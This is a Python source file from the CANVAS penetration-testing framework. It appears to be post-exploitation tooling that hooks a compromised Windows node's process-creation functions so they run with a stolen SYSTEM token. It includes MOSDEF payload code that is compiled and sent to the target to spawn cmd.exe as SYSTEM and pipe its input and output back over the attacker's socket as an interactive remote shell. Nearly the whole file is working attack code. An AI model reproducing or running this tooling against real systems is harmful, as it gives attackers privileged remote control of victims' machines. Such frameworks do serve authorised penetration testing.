#!/usr/bin/env python

"""
node_utils.py - useful utilities for nodes in CANVAS
(c) Immunity, Inc. 2018
"""
import logging

from MOSDEF.mosdefutils import sint32

#
# Exported functions
#
def to_node_with_token(node, token_system):
    """
    This function is a helper to update some internals method of
    mosdefshellserver when an node elevate its privileges to system
    """
    if node.nodetype.lower() in ["win64node", "win32node"]: # only windows node
        r, version = node.shell.GetVersionEx()
        major = version['Major Version']
        minor = version['Minor Version']
        if major >= 6 or (major == 5 and minor == 2): # is major than vista or is w2k3
            new_node = NodeWithTokenWrapper(node, token_system)
            return new_node

    return None

def update_graph_node(node, engine, whoami=''):
    if not hasattr(engine.gui, 'meatmarket'):
        return 

    cNode = engine.gui.meatmarket.node_to_ui_obj_dict[node.getname()]
    if not whoami and hasattr(node.shell, 'popen2') and node.shell.popen2:
        whoami = node.shell.popen2('whoami')
    cNode.whoami = whoami
    cNode.request_update()

#
# Helper Class
#
class NodeWithTokenWrapper(object):
    """
    This Class is a helper to overwrite the functionality of the node where
    CreateProcessA is used (replace it with CreateProcessWithTokenW)

    Three methods in a node object use this WinAPI:
     - popen2
     - CreateProcessA
     - shellshock
    """
    def __init__(self, node, token_system):
        self.node = node
        self.token_system = token_system
        self._replace_functions()

    def _replace_functions(self):
        self.node.shell.popen2 = self.popen2_with_token
        self.node.shell.CreateProcessA = self.CreateProcessWithToken
        self.node.shell.shellshock = self.shellshock_with_token

    def popen2_with_token(self, command):
        """
        runs a command and returns the result
        Note how it uses TCP's natural buffering, and
        doesn't require a ping-pong like protocol.
        """
        #self.token_system = ''
        vars={}
        vars["command"]=command

        if command=="":
            return "You need to enter in a command."

        cmdexe= self.node.shell.getComSpec()
        #cmdexe="C:\\winnt\\temp\\testmemcpy.exe"
        vars["cmdexe"]=cmdexe

        #the result here is both inheritable
        (ret,hChildStdinRd,hChildStdinWr)=self.node.shell.CreatePipe()
        if ret==0:
            #failed to create pipe
            return "Failed to create pipe!"

        #print "Pipe created: %x %x"%(hChildStdinRd,hChildStdinWr)

        #Create a non-inheritable duplicate
        (ret,hChildStdinWrDup)=self.node.shell.DuplicateHandle(hChildStdinWr)
        if ret==0:
            return "Failed to duplicate handle for writing"

        self.node.shell.CloseHandle(hChildStdinWr)

        (ret,hChildStdoutRd,hChildStdoutWr)=self.node.shell.CreatePipe()
        if ret==0:
            #failed to create pipe
            return "Failed to create stdout pipe!"

        (ret, hChildStdoutRdDup) = self.node.shell.DuplicateHandle(hChildStdoutRd)
        if ret == 0:
            return "Failed to duplicate handle for reading"

        self.node.shell.CloseHandle(hChildStdoutRd)

        command = "cmd.exe /c "+command

        cmdline = "{} {}".format(cmdexe, command)
        vars = {}
        vars["cmdline"] = cmdline.encode("utf-16-le")+"\x00\x00"
        #vars["cmdexe"] =cmdexe
        vars["stdin"] = hChildStdinRd
        vars["stdout"] = hChildStdoutWr
        code="""
        #import "local","sendint" as "sendint"
        #import "TYPE_IMPORT","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "TYPE_IMPORT","advapi32.dll|CreateProcessWithTokenW" as "CreateProcessWithTokenW"
        #import "string","cmdline" as "cmdline"
        #import "local", "memset" as "memset"
        """

        if self.node.nodetype.lower() == 'win64node':
          code += """
          #import "long long", "stdin" as "stdin"
          #import "long long", "stdout" as "stdout"
          """
        else:
          code += """
          #import "int", "stdin" as "stdin"
          #import "int", "stdout" as "stdout"
          """
        #import "local", "debug" as "debug"
        code += """
        struct STARTUPINFO {
            int cb;
            //int alignment1;
            char* lpReserved;
            char* lpDesktop;
            char* lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            //int alignment2;
            int * lpReserved2;
        """
        if self.node.nodetype.lower() == 'win64node':
          code += """
            long long hStdInput;
            long long hStdOutput;
            long long hStdError;
          """
        else:
          code += """
            int hStdInput;
            int hStdOutput;
            int hStdError;
          """

        code += """
        };

        void main() {
          struct STARTUPINFO si;
          int inherithandles;
          int i;
          char pi[32];
          memset(pi,0,16);
          inherithandles=1;

          GetStartupInfoA(&si);

          si.dwFlags=0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
          si.wShowWindow=0;
          si.hStdInput=stdin;
          si.hStdOutput=stdout;
          si.hStdError=stdout;
          si.lpDesktop=0; // system doesn't have a desktop
          //CreateProcessWithTokenW: https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw
          i=CreateProcessWithTokenW(TOKEN_HANDLE, 0, 0, cmdline, 0, 0, 0, &si,pi);
          sendint(i);
        }

        """

        if self.node.nodetype.lower() == 'win64node':
          code = code.replace("TYPE_IMPORT", "local")
        else:
          code = code.replace("TYPE_IMPORT", "remote")


        code = code.replace("TOKEN_HANDLE", str(self.token_system))
        logging.debug('VARS: ' + str(vars))
        logging.debug('MOSDEF CODE: ' + code)
        self.node.shell.clearfunctioncache()
        request=self.node.shell.compile(code,vars)
        logging.debug('SHELL: ' + str(request).encode('hex'))
        self.node.shell.sendrequest(request)
        ret=self.node.shell.readint()
        self.node.shell.leave()

        if ret!=1:
            return "Failed to CreateProcessWithToken on cmd.exe!"
        else:
            pass
            #print "Process spawned"

        #must close this side of the handle before reading from pipe
        self.node.shell.CloseHandle(hChildStdoutWr)
        #print "Closed %x"%hChildStdoutWr

        retdata=self.node.shell.readfromfd(hChildStdoutRdDup,-1)
        retdata=self.node.shell.localize_string(retdata)
        #cleanup
        self.node.shell.CloseHandle(hChildStdoutRdDup)
        self.node.shell.CloseHandle(hChildStdinWrDup)
        self.node.shell.CloseHandle(hChildStdinRd)

        return retdata

    def CreateProcessWithToken(self, command, inherithandles=0, dwCreationFlags=0x00000000):
        """
        Wrapper around of CreateProcessWithTokenW
        """
        vars={}
        vars["lpAplicationName"] = None
        vars["command"] = command.encode("utf-16-le")+"\x00\x00"
        vars["inherithandles"] = inherithandles
        vars["creationflags"] = dwCreationFlags

        code="""
        #import "TYPE_IMPORT","advapi32.dll|CreateProcessWithTokenW" as "CreateProcessWithTokenW"
        #import "TYPE_IMPORT","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "local", "memset" as "memset"

        #import "local","sendint" as "sendint"
        #import "string", "command" as "command"
        #import "string", "lpAplicationName" as "lpAplicationName"
        #import "int", "inherithandles" as "inherithandles"
        #import "int", "creationflags" as "creationflags"

        struct STARTUPINFO {
            int cb;
            //int alignment1;         // TODO: this shouldn't be necesary
            char* lpReserved;
            char* lpDesktop;
            char* lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            //int alignment2;        // TODO: this shouldn't be necesary
            int * lpReserved2;
        """
        if self.node.nodetype.lower() == 'win64node':
          code += """
            long long hStdInput;
            long long hStdOutput;
            long long hStdError;
          """
        else:
          code += """
            int hStdInput;
            int hStdOutput;
            int hStdError;
          """

        code += """
        };

        void main() {
          struct STARTUPINFO si;
          int i;
          char pi[32];

          memset(pi,0,16);

          GetStartupInfoA(&si);
          si.dwFlags=0x0001; //STARTF_USESHOWWINDOW
          si.wShowWindow=1;
          // system doesn't have a desktop
          si.lpDesktop=0;
          //CreateProcessWithTokenW: https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw
          i=CreateProcessWithTokenW(TOKEN_HANDLE, 0, 0, command, 0, 0, 0, &si,pi);
          sendint(i);
        }
        """
        if self.node.nodetype.lower() == 'win64node':
          code = code.replace("TYPE_IMPORT", "local")
        else:
          code = code.replace("TYPE_IMPORT", "remote")
        code = code.replace("TOKEN_HANDLE", str(self.token_system))
        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(request)

        ret = sint32(self.node.shell.readint())
        self.node.shell.leave()

        logging.debug("CreateProcessA returned %d" % ret)

        return ret

    def shellshock_with_token(self, logfile=None):
        """
        win64 cmd.exe shellshock, modified from dave's popen2
        """
        self.node.shell.log("Shellshocking")

        vars={}
        cmdexe=self.node.shell.getComSpec()
        self.node.shell.log("ComSpec: %s"%cmdexe)
        vars["cmdexe"]=cmdexe

        (ret,hChildStdinRd,hChildStdinWr)=self.node.shell.CreatePipe()
        if ret==0:
            return "Failed to create pipe!"
        (ret,hChildStdinWrDup)=self.node.shell.DuplicateHandle(hChildStdinWr)
        if ret==0:
            return "Failed to duplicate handle for writing"
        (ret,hChildStdoutRd,hChildStdoutWr)=self.node.shell.CreatePipe()
        if ret==0:
            return "Failed to create stdout pipe!"
        (ret,hChildStdoutRdDup)=self.node.shell.DuplicateHandle(hChildStdoutRd)
        if ret==0:
            return "Failed to duplicate handle for reading"

        self.node.shell.CloseHandle(hChildStdoutRd)
        self.node.shell.CloseHandle(hChildStdinWr)

        command="cmd.exe"

        self.node.shell.clearfunctioncache()
        vars={}
        vars["command"]="{} {}".format(cmdexe, command)
        vars["cmdexe"]=cmdexe
        vars["stdin"]=hChildStdinRd
        vars["stdout"]=hChildStdoutWr
        vars["mosdefd"]=self.node.shell.fd
        vars["readfd"]=hChildStdoutRdDup
        vars["writefd"]=hChildStdinWrDup

        code="""
        #import "TYPE_IMPORT","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "TYPE_IMPORT","advapi32.dll|CreateProcessWithTokenW" as "CreateProcessWithTokenW"
        #import "TYPE_IMPORT", "kernel32.dll|ReadFile" as "ReadFile"
        #import "TYPE_IMPORT", "kernel32.dll|WriteFile" as "WriteFile"
        #import "TYPE_IMPORT", "kernel32.dll|PeekNamedPipe" as "PeekNamedPipe"
        #import "TYPE_IMPORT", "ws2_32.dll|select" as "select"
        #import "TYPE_IMPORT", "ws2_32.dll|recv" as "recv"
        #import "TYPE_IMPORT", "kernel32.dll|CloseHandle" as "CloseHandle"
        //#import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "memset" as "memset"
        #import "local", "writeblock" as "writeblock"
        #import "local", "sendint" as "sendint"
        #import "string","cmdexe" as "cmdexe"
        #import "string","command" as "command"
        """

        if self.node.nodetype.lower() == 'win64node':
          code += """
          #import "long long", "stdin" as "stdin"
          #import "long long", "stdout" as "stdout"
          #import "long long", "mosdefd" as "mosdefd"
          #import "long long", "readfd" as "readfd"
          #import "long long", "writefd" as "writefd"
          """
        else:
          code += """
          #import "int", "stdin" as "stdin"
          #import "int", "stdout" as "stdout"
          #import "int", "mosdefd" as "mosdefd"
          #import "int", "readfd" as "readfd"
          #import "int", "writefd" as "writefd"         
          """

        code += """
        //#import "local", "debug" as "debug"


        struct STARTUPINFO {
            int cb;
            char* lpReserved;
            char* lpDesktop;
            char* lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            int * lpReserved2;
        """
        if self.node.nodetype.lower() == 'win64node':
          code += """
            long long hStdInput;
            long long hStdOutput;
            long long hStdError;
          """
        else:
          code += """
            int hStdInput;
            int hStdOutput;
            int hStdError;
          """

        code += """
        };


        struct timeval {
                int tv_sec;
                int tv_usec; };

        struct  fd_set_t {
                   int fd_count;
                   long long fd;
        };

        void main() {
          struct timeval tv;
          struct STARTUPINFO si;
          struct fd_set_t fd_set;
          int inherithandles;
          int i;
          int n;
          int noread;
          int numread;
          int numwritten;
          char in[512];
          char out[512];
          char pi[32];

          //changed 16 to 32
          memset(pi,0,32);

          inherithandles = 1;
          GetStartupInfoA(&si);
          si.dwFlags = 0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
          si.wShowWindow = 0;
          si.hStdInput = stdin;
          si.hStdOutput = stdout;
          si.hStdError = stdout;
          si.lpDesktop = 0; // system doesn't have a desktop

          //i = CreateProcessA(cmdexe,command,0,0,inherithandles,0,0,0,&si,pi);
          //CreateProcessWithTokenW: https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw
          i=CreateProcessWithTokenW(TOKEN_HANDLE, 0, cmdexe, command, 0, 0, 0, &si,pi);
          sendint(i);

          // close stdoutwr and stdinrd
          CloseHandle(stdout);
          CloseHandle(stdin);

          // main io loop (bit of a kludge, but it'll do for now)
          while(1)
          {

            fd_set.fd_count = 1; // actual n
            fd_set.fd = mosdefd;
            n = 2; // ignored
            tv.tv_sec = 0;
            tv.tv_usec = 10;
            // very small timeout
            i = select(n, &fd_set, 0, 0, &tv);
            if (i != 0)
            {
              memset(&in, 0, 512);
              i = recv(mosdefd, in, 511, 0);
              //dump to filehandle
              WriteFile(writefd, in, i, &numwritten, 0);
            }

            i = 1;
            // dump response from cmd.exe back to remote
            while (i != 0)
            {
              noread=0;
              n = PeekNamedPipe(readfd, 0, 0, &numread, &numwritten, 0);

              if(n == 0)
              {
                // process is gone, prolly exited :P
                // WriteFile + sockets d't go together
                writeblock(mosdefd, &n, 4);
                // be shellshock_loop non-xor compatible
                return;
              }

              if(numread == 0)
              {
                noread = 1;
                i = 0;
              }
              numread = 0;
              if (noread == 0)
              {
                memset(&out, 0, 512);
                i = ReadFile(readfd, out, 511, &numread, 0);
              }
              // i want && support !
              if(i != 0)
              {
                if (numread != 0)
                {
                  writeblock(mosdefd, &numread, 4); // be shellshock_loop non-xor compatible
                  writeblock(mosdefd, out, numread);
                }
              }
            }
          }
        }

        """
        if self.node.nodetype.lower() == 'win64node':
          code = code.replace("TYPE_IMPORT", "local")
        else:
          code = code.replace("TYPE_IMPORT", "remote")

        code = code.replace("TOKEN_HANDLE", str(self.token_system))
        #if you need to send some debug information
        #expect that no ;-)
        debugblock = '''
            g = GetLastError();
            h = 4;
            writeblock(mosdefd, &h, 4);
            writeblock(mosdefd, &g, 4);
        '''

        # sendint and readint use xorkey!!!
        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code,vars)
        self.node.shell.sendrequest(request)

        # createprocess result
        ret =  self.node.shell.readint()
        if ret == 0:
            self.node.shell.log("Couldn't create process, returning...")
            self.node.shell.CloseHandle(hChildStdoutRdDup)
            self.node.shell.CloseHandle(hChildStdinWrDup)
            return

        # shellshock loop
        ret = self.node.shell.shellshock_loop(endian="little", logfile=logfile)

        self.node.shell.leave()

        self.node.shell.CloseHandle(hChildStdoutRdDup)
        self.node.shell.CloseHandle(hChildStdinWrDup)
        self.node.shell.log("Shellshock finished")
        return
